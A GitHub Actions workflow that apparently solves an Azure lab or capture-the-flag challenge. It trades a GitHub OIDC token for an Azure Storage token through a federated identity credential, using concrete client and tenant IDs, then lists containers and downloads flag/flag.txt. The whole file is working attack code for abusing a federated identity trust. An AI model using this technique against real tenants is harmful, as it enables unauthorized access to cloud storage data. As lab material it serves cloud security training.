name: Access Azure Blob via Federated Identity

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  blob-access:
    runs-on: ubuntu-latest
    steps:
      - name: Get ID token
        id: get_token
        uses: actions/github-script@v6
        with:
          script: |
            const token = await core.getIDToken("api://AzureADTokenExchange");
            core.setSecret(token);
            core.setOutput("id_token", token);

      - name: Exchange for Azure token (via federated identity)
        id: azure_token
        run: |
          ACCESS_TOKEN=$(curl -s -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=c265ea2a-1235-446d-bd74-5d8228c904b1&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${{ steps.get_token.outputs.id_token }}&scope=https://storage.azure.com/.default" \
            "https://login.microsoftonline.com/fdd066e1-ee37-49bc-b08f-d0e152119b04/oauth2/v2.0/token" | jq -r .access_token)

          echo "::add-mask::$ACCESS_TOKEN"
          echo "ACCESS_TOKEN=$ACCESS_TOKEN" >> $GITHUB_ENV

      - name: List containers
        run: |
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://iamazurelab3d26800f7.blob.core.windows.net/?comp=list" \
            | xmllint --format -

      - name: List blobs in 'flag' container
        run: |
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://iamazurelab3d26800f7.blob.core.windows.net/flag?restype=container&comp=list" \
            | xmllint --format -

      - name: Dump blob (flag.txt)
        run: |
          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
            "https://iamazurelab3d26800f7.blob.core.windows.net/flag/flag.txt" \
            || echo "Blob not found"
